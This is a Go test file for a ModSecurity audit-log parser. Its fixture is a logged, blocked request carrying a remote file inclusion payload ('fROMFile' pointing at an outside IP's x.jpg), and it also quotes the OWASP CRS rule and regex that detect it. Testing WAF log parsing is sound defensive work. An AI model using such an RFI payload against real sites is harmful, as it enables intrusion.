package modsec

import (
	"strings"
	"testing"
)

// An entry as nginx's ModSecurity v3 writes it (addresses anonymised).
const entry = `---a3zljAqE---A--
[02/Nov/2026:05:40:02 +0300] 179358720234.075113 198.51.100.7 39958 10.0.0.5 443
---a3zljAqE---B--
GET /component/ajax?fROMFile=HtTp%3A%2F%2F10.14.0.2%3A55390%2Fx.jpg HTTP/1.1
Host: shop.example.com:443
User-Agent: Mozilla/5.0
Referer: https://shop.example.com/

---a3zljAqE---E--
<html>\x0d\x0a<head><title>403 Forbidden</title></head>

---a3zljAqE---F--
HTTP/1.1 403
Server: nginx

---a3zljAqE---H--
ModSecurity: Warning. Matched "Operator ` + "`Rx' with parameter `(?i)^(f(?:ile|tps?)|https?|ssh)://(?:\\[?[0-9a-f]+:[0-:a-f]+\\]?)' against variable `ARGS:fROMFile' (Value: `HtTp://10.14.0.2:55390/x.jpg' )" + ` [file "/etc/modsecurity/owasp/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf"] [line "47"] [id "931100"] [rev ""] [msg "Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address"] [data "Matched Data: HtTp://10.14.0.2 found within ARGS:fROMFile"] [severity "2"] [ver "OWASP_CRS/4.28.0"] [tag "attack-rfi"] [tag "paranoia-level/1"] [hostname "10.0.0.5"] [uri "/component/ajax"] [unique_id "179358720234.075113"]
ModSecurity: Access denied with code 403 (phase 2). Matched "Operator ` + "`Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `5' )" + ` [file "/etc/modsecurity/owasp/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "222"] [id "949110"] [rev ""] [msg "Inbound Anomaly Score Exceeded (Total Score: 5)"] [data ""] [severity "0"] [tag "anomaly-evaluation"]

---a3zljAqE---J--

---a3zljAqE---Z--
`

func feed(p *Parser, text string) []string {
	var ids []string
	for _, line := range strings.Split(text, "\n") {
		if ev := p.Feed(line); ev != nil {
			ids = append(ids, ev.ID)
		}
	}
	return ids
}

func TestParseEntry(t *testing.T) {
	p := &Parser{Site: "shop.example.com"}
	var got []string
	for _, line := range strings.Split(entry, "\n") {
		ev := p.Feed(line)
		if ev == nil {
			continue
		}
		got = append(got, ev.ID)
		if ev.SrcIP != "198.51.100.7" || ev.SrcPort != 39958 || ev.DstPort != 443 || ev.Host != "shop.example.com" {
			t.Errorf("addresses: %+v", ev)
		}
		if ev.Method != "GET" || !strings.HasPrefix(ev.URI, "/component/ajax?") || ev.Proto != "HTTP/1.1" || ev.Status != 403 {
			t.Errorf("request: %s %s %s %d", ev.Method, ev.URI, ev.Proto, ev.Status)
		}
		if !ev.Denied || ev.Score != 5 || ev.Category != "rfi" || ev.Risk() != 2 {
			t.Errorf("verdict: denied=%v score=%d category=%s", ev.Denied, ev.Score, ev.Category)
		}
		if ev.RuleID() != "931100" || !strings.HasPrefix(ev.Reason(), "Possible Remote File Inclusion") {
			t.Errorf("top rule %s %q", ev.RuleID(), ev.Reason())
		}
		m := ev.Rules[0]
		if m.Var != "ARGS:fROMFile" || m.Severity != 2 || len(m.Tags) != 2 || m.Phase != 0 {
			t.Errorf("match %+v", m)
		}
		if !ev.Rules[1].Denied || ev.Rules[1].Phase != 2 {
			t.Errorf("deny match %+v", ev.Rules[1])
		}
		if ev.Time.UTC().Format("2006-01-02T15:04:05") != "2026-11-02T02:40:02" {
			t.Errorf("time %v", ev.Time)
		}
	}
	if len(got) != 1 {
		t.Fatalf("want 1 event, got %v", got)
	}
}

func TestResyncMidEntry(t *testing.T) {
	// A reader that starts inside an entry skips it and takes the next one.
	i := strings.Index(entry, "---a3zljAqE---F--")
	second := strings.ReplaceAll(entry, "a3zljAqE", "bbbbbbbb")
	second = strings.Replace(second, "179358720234.075113 ", "179358720299.000001 ", 1)
	p := &Parser{}
	ids := feed(p, entry[i:]+second)
	if len(ids) != 1 || ids[0] != "179358720299.000001" {
		t.Fatalf("got %v", ids)
	}
}

func TestDetectionOnlyScore(t *testing.T) {
	// No evaluation rule and no denial: the score is summed from severities.
	text := strings.Replace(entry, "ModSecurity: Access denied with code 403 (phase 2).", "ModSecurity: Warning.", 1)
	text = strings.Replace(text, "[id \"949110\"]", "[id \"920350\"]", 1)
	text = strings.Replace(text, "[severity \"0\"]", "[severity \"4\"]", 1)
	p := &Parser{}
	var score int
	var denied bool
	for _, line := range strings.Split(text, "\n") {
		if ev := p.Feed(line); ev != nil {
			score, denied = ev.Score, ev.Denied
		}
	}
	if denied || score != 8 {
		t.Fatalf("denied=%v score=%d, want pass with 5+3", denied, score)
	}
}

func TestBinaryAndLongLines(t *testing.T) {
	body := "---cccccccc---C--\n" + strings.Repeat("x\xff\xfe", 3000) + "\n"
	text := strings.Replace(entry, "---a3zljAqE---E--", body+"---a3zljAqE---E--", 1)
	text = strings.ReplaceAll(text, "cccccccc", "a3zljAqE")
	p := &Parser{}
	for _, line := range strings.Split(text, "\n") {
		if ev := p.Feed(line); ev != nil {
			if len(ev.Body) > MaxBody+4 || !strings.HasSuffix(ev.Body, "…") {
				t.Fatalf("body not truncated: %d", len(ev.Body))
			}
			return
		}
	}
	t.Fatal("no event")
}
